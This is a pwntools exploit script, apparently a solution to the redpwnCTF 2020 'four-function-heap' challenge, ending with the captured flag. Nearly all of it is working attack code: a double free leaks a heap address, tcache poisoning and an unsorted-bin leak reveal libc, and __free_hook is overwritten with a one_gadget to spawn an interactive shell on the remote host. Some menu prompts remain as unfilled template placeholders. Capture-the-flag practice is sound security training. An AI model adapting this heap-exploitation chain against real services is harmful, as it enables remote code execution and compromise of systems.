from pwn import *
import sys

if len(sys.argv) < 2:
	e = "./four-function-heap"
	r = process(e)
	raw_input('debug')
else:
	host, port = "2020.redpwnc.tf", 31774
	r = remote(host, port)
	
libc = ELF("./libc.so.6")

def alloc(idx, size, data="AAAA"):
  r.sendlineafter('{{prompts.menu}}: ',"1")
  r.sendlineafter("{{prompts.index}}: ", str(idx))
  r.sendlineafter("{{prompts.size}}: ", str(size))
  r.sendlineafter("{{prompts.read}}: ", data)

def free(idx):
  r.sendlineafter('{{prompts.menu}}: ',"2")
  r.sendlineafter("{{prompts.index}}: ", str(idx))

def show(idx):
  r.sendlineafter('{{prompts.menu}}: ',"3")
  r.sendlineafter("{{prompts.index}}: ", str(idx))

alloc(0, 0x100, 'aaaaaaaabbbbbbbbccccccccdddddddd')
free(0)
free(0)
show(0)
res = r.recv(6) + '\x00'*2
leak_heap = u64(res)
log.info('%#x' %leak_heap)

alloc(0, 0x100, p64(leak_heap) + p64(leak_heap))
alloc(0, 0x100, p64(leak_heap) + p64(leak_heap))

alloc(0, 0x480, "linh")

alloc(0, 0x100, p64(leak_heap) + p64(leak_heap))
free(0)
show(0)
res = r.recv(6) + '\x00'*2
leak_libc = u64(res)
log.info('%#x' %leak_libc)

libc_base = leak_libc - 0x3ebca0
log.info('libc address: %#x' %libc_base)
free_hook_offset = libc.symbols['__free_hook']
free_hook_add = libc_base + free_hook_offset
log.info('free_hook_add = %#x' %free_hook_add)
one_gadg = libc_base + 0x4f322

alloc(0, 0x40, p64(free_hook_add))
alloc(0, 0x100, "AAAAAAAA")
alloc(0, 0x100, p64(one_gadg))
free(0)

r.interactive()
r.close()

# flag{g3n3ric_f1ag_1n_1e3t_sp3ak}
